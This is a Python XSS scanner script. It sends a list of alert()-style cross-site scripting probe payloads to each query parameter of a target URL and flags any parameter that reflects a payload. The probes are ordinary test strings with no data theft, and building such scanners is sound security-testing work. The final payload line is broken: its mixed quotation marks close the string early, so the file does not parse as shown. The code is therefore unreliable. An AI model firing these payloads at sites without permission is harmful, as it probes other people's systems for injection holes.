#!/usr/bin/env python3
"""
XSS (Cross-Site Scripting) Scanner
===================================
"""

import requests
import urllib.parse
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

class XSSScanner:
    def __init__(self, url):
        self.url = url
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'"><script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
    def test_payload(self, payload):
        """Test XSS payload"""
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params:
            test_params = params.copy()
            test_params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
            
            try:
                response = requests.get(test_url, timeout=10)
                
                if payload in response.text:
                    print(f"{Fore.RED}[!] VULNERABLE: {param}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}    Payload reflected: {payload[:50]}...{Style.RESET_ALL}")
                    return True
            except:
                pass
        
        return False
    
    def scan(self):
        """Run scan"""
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}XSS Scanner{Style.RESET_ALL}")
        print(f"{Fore.BLUE}Target: {self.url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}\n")
        
        found = False
        for payload in self.payloads:
            if self.test_payload(payload):
                found = True
        
        if not found:
            print(f"\n{Fore.GREEN}[+] No XSS vulnerabilities found{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] XSS vulnerability detected!{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    
    args = parser.parse_args()
    
    scanner = XSSScanner(args.url)
    scanner.scan()

if __name__ == "__main__":
    main()
